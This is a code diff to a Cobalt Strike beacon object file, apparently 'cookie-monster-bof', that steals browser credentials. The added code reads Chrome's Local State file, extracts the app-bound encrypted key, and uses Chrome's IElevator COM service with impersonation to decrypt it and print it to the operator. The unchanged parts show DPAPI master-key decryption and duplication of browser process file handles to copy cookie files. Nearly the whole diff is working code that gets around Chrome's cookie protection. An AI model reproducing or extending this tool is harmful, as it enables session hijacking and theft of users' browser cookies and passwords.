@@ -4,13 +4,15 @@
 // https://github.com/fortra/nanodump
 
 #include <windows.h>
+#include <stdint.h> 
+#include <ctype.h>
 #include <stdio.h>
 #include <tlhelp32.h>
 #include "cookie-monster-bof.h"
 #include "beacon.h"
 
 CHAR *GetFileContent(CHAR *path);
-CHAR *ExtractKey(CHAR *buffer);
+CHAR *ExtractKey(CHAR *buffer, CHAR *pattern);
 VOID GetMasterKey(CHAR *key);
 VOID GetChromeKey();
 VOID GetFirefoxInfo();
@@ -29,6 +31,11 @@ WINBASEAPI BOOL WINAPI    KERNEL32$ReadFile (HANDLE hFile, LPVOID lpBuffer, DWOR
 WINBASEAPI BOOL WINAPI    KERNEL32$CloseHandle (HANDLE hObject);
 WINBASEAPI char* __cdecl  MSVCRT$strstr (char* _String, const char* _SubString);
 WINBASEAPI size_t __cdecl MSVCRT$strlen (const char *s);
+DECLSPEC_IMPORT PCHAR __cdecl MSVCRT$strchr(const char *haystack, int needle);
+WINBASEAPI int __cdecl MSVCRT$sprintf(char *__stream, const char *__format, ...);
+WINBASEAPI void *__cdecl MSVCRT$memcpy(void * __restrict__ _Dst,const void * __restrict__ _Src,size_t _MaxCount);
+
+WINBASEAPI int __cdecl MSVCRT$memcmp(const void *_Buf1,const void *_Buf2,size_t _Size);
 WINBASEAPI char* __cdecl  MSVCRT$strncpy (char * __dst, const char * __src, size_t __n);
 WINBASEAPI char* __cdecl  MSVCRT$strncat (char * _Dest,const char * _Source, size_t __n);
 DECLSPEC_IMPORT int WINAPI MSVCRT$strcmp(const char*, const char*);
@@ -53,16 +60,23 @@ WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap (VOID);
 WINBASEAPI LPVOID WINAPI KERNEL32$HeapAlloc (HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
 DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtQueryObject(HANDLE, OBJECT_INFORMATION_CLASS, PVOID, ULONG, PULONG);
 
+WINBASEAPI BSTR WINAPI OLEAUT32$SysAllocStringByteLen(LPCSTR psz,UINT len);
+WINBASEAPI void WINAPI OLEAUT32$SysFreeString(BSTR);
+WINBASEAPI UINT WINAPI OLEAUT32$SysStringByteLen(BSTR bstr);
+
+DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeEx (LPVOID pvReserved, DWORD dwCoInit);
+DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoUninitialize (void);
+DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance (REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID *ppv);
+DECLSPEC_IMPORT	HRESULT WINAPI OLE32$CoSetProxyBlanket(IUnknown* pProxy, DWORD dwAuthnSvc, DWORD dwAuthzSvc, OLECHAR* pServerPrincName, DWORD dwAuthnLevel, DWORD dwImpLevel, RPC_AUTH_IDENTITY_HANDLE pAuthInfo, DWORD dwCapabilities);
+WINBASEAPI void __cdecl MSVCRT$free(void *_Memory);
+WINBASEAPI void* WINAPI MSVCRT$malloc(SIZE_T);
 #define IMPORT_RESOLVE FARPROC SHGetFolderPath = Resolver("shell32", "SHGetFolderPathA"); \
     FARPROC PathAppend = Resolver("shlwapi", "PathAppendA"); \
-    FARPROC sprintf = Resolver("msvcrt", "sprintf"); \
     FARPROC srand = Resolver("msvcrt", "srand");\
     FARPROC time = Resolver("msvcrt", "time");\
     FARPROC strnlen = Resolver("msvcrt", "strnlen");\
     FARPROC rand = Resolver("msvcrt", "rand");\
-    FARPROC realloc = Resolver("msvcrt", "realloc");\
-    FARPROC malloc = Resolver("msvcrt", "malloc");\
-    FARPROC free = Resolver("msvcrt", "free");
+    FARPROC realloc = Resolver("msvcrt", "realloc");
 #define intAlloc(size) KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, size)
 #define intFree(addr) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, addr)
 #define DATA_FREE(d, l) \
@@ -113,9 +127,9 @@ CHAR *GetFileContent(CHAR *path) {
     return buffer;
 }
 
-CHAR *ExtractKey(CHAR *buffer) {
+CHAR *ExtractKey(CHAR *buffer, CHAR * pattern) {
     //look for pattern with key
-    CHAR pattern[] = "\"encrypted_key\":\"";
+    //CHAR pattern[] = "\"encrypted_key\":\"";
     CHAR *start = MSVCRT$strstr(buffer, pattern);
     CHAR *end = NULL;
     CHAR *key = NULL;
@@ -174,7 +188,7 @@ VOID GetMasterKey(CHAR *key) {
     CHAR *output = (CHAR*)KERNEL32$GlobalAlloc(GPTR, (final.cbData * 4) + 1);
     DWORD i = 0;
     for(i = 0; i < final.cbData; i++) {
-        sprintf(output, "%s\\x%02x", output, final.pbData[i]);
+        MSVCRT$sprintf(output, "%s\\x%02x", output, final.pbData[i]);
     }
     BeaconPrintf(CALLBACK_OUTPUT,"Decrypt Key: %s \n", output );
 
@@ -183,6 +197,140 @@ VOID GetMasterKey(CHAR *key) {
     KERNEL32$GlobalFree(output);
 }
 
+// https://gist.github.com/snovvcrash/caded55a318bbefcb6cc9ee30e82f824
+const uint8_t kCryptAppBoundKeyPrefix[] = { 'A', 'P', 'P', 'B' };
+const char* BASE64_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+#define KEY_SIZE 32
+
+int isBase64(char c) {
+    return (c >= 'A' && c <= 'Z') ||    // Uppercase letters
+           (c >= 'a' && c <= 'z') ||    // Lowercase letters
+           (c >= '0' && c <= '9') ||    // Digits
+           (c == '+') || (c == '/');    // '+' and '/'
+}
+
+uint8_t* Base64Decode(const char* encoded_string, size_t* out_len) {
+    int in_len = MSVCRT$strlen(encoded_string);
+    int i = 0, j = 0, in_ = 0;
+    uint8_t char_array_4[4], char_array_3[3];
+    size_t decoded_size = (in_len * 3) / 4;
+    uint8_t* decoded_data = (uint8_t*)MSVCRT$malloc(decoded_size);
+
+    *out_len = 0;
+    while (in_len-- && (encoded_string[in_] != '=') && isBase64(encoded_string[in_])) {
+        char_array_4[i++] = encoded_string[in_]; in_++;
+        if (i == 4) {
+            for (i = 0; i < 4; i++) char_array_4[i] = MSVCRT$strchr(BASE64_CHARS, char_array_4[i]) - BASE64_CHARS;
+            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
+            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
+            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
+
+            for (i = 0; i < 3; i++) decoded_data[(*out_len)++] = char_array_3[i];
+            i = 0;
+        }
+    }
+
+    if (i) {
+        for (j = i; j < 4; j++) char_array_4[j] = 0;
+        for (j = 0; j < 4; j++) char_array_4[j] = MSVCRT$strchr(BASE64_CHARS, char_array_4[j]) - BASE64_CHARS;
+        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
+        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
+        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
+
+        for (j = 0; j < i - 1; j++) decoded_data[(*out_len)++] = char_array_3[j];
+    }
+
+    //BeaconPrintf(CALLBACK_OUTPUT, "Decoded Data: %s\n", decoded_data);  
+    return decoded_data;
+}
+
+char* BytesToHexString(const BYTE *byteArray, size_t size) {
+    char *hexStr = (char*)MSVCRT$malloc((size * 4) + 1);
+    if (!hexStr) return NULL;
+    for (size_t i = 0; i < size; ++i) {
+        MSVCRT$sprintf(hexStr + (i * 4), "\\x%02x", byteArray[i]);
+    }
+    return hexStr;
+}
+
+VOID GetAppBoundKey(CHAR * key, const CLSID CLSID_Elevator, const IID IID_IElevator) {
+    // initialize COM
+    HRESULT hr = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+    if (FAILED(hr)) {
+        BeaconPrintf(CALLBACK_ERROR,"CoInitializeEx failed.\n");
+        return;
+    }
+    IElevator* elevator = NULL;
+    // Create an instance of the IElevator COM object
+    hr = OLE32$CoCreateInstance(&CLSID_Elevator, NULL, CLSCTX_LOCAL_SERVER, &IID_IElevator, (void**)&elevator);
+    if (FAILED(hr)) {
+        BeaconPrintf(CALLBACK_ERROR,"Failed to create IElevator instance.\n");
+        OLE32$CoUninitialize();
+        return;
+    }
+    // Set the security blanket on the proxy
+    hr = OLE32$CoSetProxyBlanket(
+        elevator,
+        RPC_C_AUTHN_DEFAULT,
+        RPC_C_AUTHZ_DEFAULT,
+        COLE_DEFAULT_PRINCIPAL,
+        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
+        RPC_C_IMP_LEVEL_IMPERSONATE,
+        NULL,
+        EOAC_DYNAMIC_CLOAKING
+    );
+
+    if (FAILED(hr)) {
+        BeaconPrintf(CALLBACK_ERROR,"Failed to set proxy blanket.\n");
+        OLE32$CoUninitialize();
+        return;
+    }
+    
+    // base64 decode
+    size_t encrypted_key_len;
+    uint8_t* encrypted_key_with_header = Base64Decode(key, &encrypted_key_len);
+    if (MSVCRT$memcmp(encrypted_key_with_header, kCryptAppBoundKeyPrefix, sizeof(kCryptAppBoundKeyPrefix)) != 0) {
+        BeaconPrintf(CALLBACK_ERROR, "Invalid key header.\n");
+        MSVCRT$free(encrypted_key_with_header);
+        OLE32$CoUninitialize();
+        return;
+    }
+    
+    //remove app bound key prefix
+    uint8_t *encrypted_key = (uint8_t*)MSVCRT$malloc(encrypted_key_len - sizeof(kCryptAppBoundKeyPrefix));
+    MSVCRT$memcpy(encrypted_key, encrypted_key_with_header + sizeof(kCryptAppBoundKeyPrefix), encrypted_key_len - sizeof(kCryptAppBoundKeyPrefix));
+    encrypted_key_len -= sizeof(kCryptAppBoundKeyPrefix);
+    //BeaconPrintf(CALLBACK_OUTPUT, "encrypted key length %d\n", encrypted_key_len);
+
+    BSTR ciphertext_data = OLEAUT32$SysAllocStringByteLen((const char*)encrypted_key , encrypted_key_len );
+    
+    //BeaconPrintf(CALLBACK_OUTPUT, "Base64 Decoded Encrypted Key: %s\n", BytesToHexString(ciphertext_data, encrypted_key_len));
+    BSTR plaintext_data = NULL;
+    DWORD last_error = ERROR_GEN_FAILURE;
+    // call com to decrypt key
+    hr = elevator->lpVtbl->DecryptData(elevator,ciphertext_data, &plaintext_data, &last_error);
+    
+    // return decrypted key
+    if (SUCCEEDED(hr)) {
+        //BeaconPrintf(CALLBACK_OUTPUT, "Decryption succeeded.\n");
+        DWORD decrypted_size = OLEAUT32$SysStringByteLen(plaintext_data);
+        //BeaconPrintf(CALLBACK_OUTPUT, "Decrypted Data Size: %d\n", decrypted_size);
+        BeaconPrintf(CALLBACK_OUTPUT, "Decrypted App Bound Key: %s\n", BytesToHexString(plaintext_data, decrypted_size));
+
+    } else {
+        BeaconPrintf(CALLBACK_ERROR, "App Bound Key Decryption failed. Last error: %lu\n If error 203, beacon is most likely not operating out of correct file path \n", last_error);
+    }
+
+    OLEAUT32$SysFreeString(plaintext_data);
+    OLEAUT32$SysFreeString(ciphertext_data);
+    
+    MSVCRT$free(encrypted_key_with_header);
+    MSVCRT$free(encrypted_key);
+    OLE32$CoUninitialize();
+
+    return;
+
+}
 VOID GetChromeKey() {
     //get chrome key
     CHAR *data = GetFileContent("\\Google\\Chrome\\User Data\\Local State");
@@ -193,7 +341,9 @@ VOID GetChromeKey() {
         return;
     }
     //BeaconPrintf(CALLBACK_OUTPUT, "Got Chrome Local State File");
-    key = ExtractKey(data);
+    // extract CHAR pattern[] = "\"encrypted_key\":\""; from file
+    CHAR pattern[] = "\"encrypted_key\":\"";
+    key = ExtractKey(data, pattern);
     KERNEL32$GlobalFree(data);
     if(key == NULL) {
         BeaconPrintf(CALLBACK_ERROR,"getting the key failed.\n");
@@ -201,6 +351,18 @@ VOID GetChromeKey() {
     }
     //BeaconPrintf(CALLBACK_OUTPUT, "Got Chrome Key ");
     GetMasterKey(key);
+
+    CHAR *app_key = NULL;
+    CHAR *app_data = GetFileContent("\\Google\\Chrome\\User Data\\Local State");
+    CHAR app_pattern[] =  "\"app_bound_encrypted_key\":\"";
+    if(app_data == NULL) {
+        BeaconPrintf(CALLBACK_ERROR,"Reading the file failed.\n");
+        return;
+    }
+    app_key = ExtractKey(app_data, app_pattern);    
+    GetAppBoundKey(app_key, Chrome_CLSID_Elevator, Chrome_IID_IElevator);
+    KERNEL32$GlobalFree(app_data);
+
     return;
 }
 
@@ -212,14 +374,17 @@ VOID GetEdgeKey() {
         BeaconPrintf(CALLBACK_ERROR,"Reading the file failed.\n");
         return;
     }
-
-    key = ExtractKey(data);
+    // extract CHAR pattern[] = "\"encrypted_key\":\""; from file
+    CHAR pattern[] = "\"encrypted_key\":\"";
+    key = ExtractKey(data, pattern);
     KERNEL32$GlobalFree(data);
     if(key == NULL) {
         BeaconPrintf(CALLBACK_ERROR,"getting the key failed.\n");
         return;
     }
     GetMasterKey(key);
+
+    // TO DO - App Bound Key
 }
 
 CHAR *GetFirefoxFile(CHAR *file, CHAR* profile){
@@ -436,7 +601,7 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName) {
         SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handle = shi->Handles[i];
         if((DWORD)(ULONG_PTR)handle.UniqueProcessId == PID) {
             //BeaconPrintf(CALLBACK_OUTPUT, "Found PID");
-            POBJECT_NAME_INFORMATION objectNameInfo = (POBJECT_NAME_INFORMATION)malloc(0x1000);
+            POBJECT_NAME_INFORMATION objectNameInfo = (POBJECT_NAME_INFORMATION)MSVCRT$malloc(0x1000);
             ULONG returnLength = 0;
             NTSTATUS ret = 0;
             if(handle.GrantedAccess != 0x001a019f || ( handle.HandleAttributes != 0x2 && handle.GrantedAccess == 0x0012019f)) {
@@ -444,7 +609,7 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName) {
                 if(hProc == INVALID_HANDLE_VALUE) {
                     BeaconPrintf(CALLBACK_ERROR,"OpenProcess failed %d\n", KERNEL32$GetLastError());
                     KERNEL32$GlobalFree(shi);
-                    free(objectNameInfo);
+                    MSVCRT$free(objectNameInfo);
                     return FALSE;
                 }
 
@@ -466,21 +631,21 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName) {
                 {
                     BeaconPrintf(CALLBACK_ERROR,"Failed NtQueryObject");
                     KERNEL32$GlobalFree(shi);
-                    free(objectNameInfo);
+                    MSVCRT$free(objectNameInfo);
                     return FALSE;
                 }
                 if (ret == 0 && objectNameInfo->Name.Length > 0){
                     char handleName[1024];
-                    sprintf(handleName, "%.*ws", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);
+                    MSVCRT$sprintf(handleName, "%.*ws", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);
 
-                    PPUBLIC_OBJECT_TYPE_INFORMATION objectTypeInfo = (PPUBLIC_OBJECT_TYPE_INFORMATION)malloc(0x1000);
+                    PPUBLIC_OBJECT_TYPE_INFORMATION objectTypeInfo = (PPUBLIC_OBJECT_TYPE_INFORMATION)MSVCRT$malloc(0x1000);
                     ret = NTDLL$NtQueryObject(hDuplicate,ObjectTypeInformation, objectTypeInfo, 0x1000, &returnLength);
                     if (ret != 0)
                     {
                         BeaconPrintf(CALLBACK_ERROR,"Failed NtQueryObject");
                         KERNEL32$GlobalFree(shi);
-                        free(objectTypeInfo);
-                        free(objectNameInfo);
+                        MSVCRT$free(objectTypeInfo);
+                        MSVCRT$free(objectNameInfo);
                         return FALSE;
                     }
                     if (ret == 0 && (MSVCRT$strcmp(objectTypeInfo,"File"))){
@@ -502,15 +667,15 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName) {
                             
                             KERNEL32$GlobalFree(buffer);
                             KERNEL32$GlobalFree(shi);
-                            free(objectTypeInfo);
-                            free(objectNameInfo);
+                            MSVCRT$free(objectTypeInfo);
+                            MSVCRT$free(objectNameInfo);
                             return TRUE;
                         }
                         
                     }else{
                         KERNEL32$CloseHandle(hDuplicate);
-                        free(objectTypeInfo);
-                        free(objectNameInfo);
+                        MSVCRT$free(objectTypeInfo);
+                        MSVCRT$free(objectNameInfo);
                     }
                 }
             }
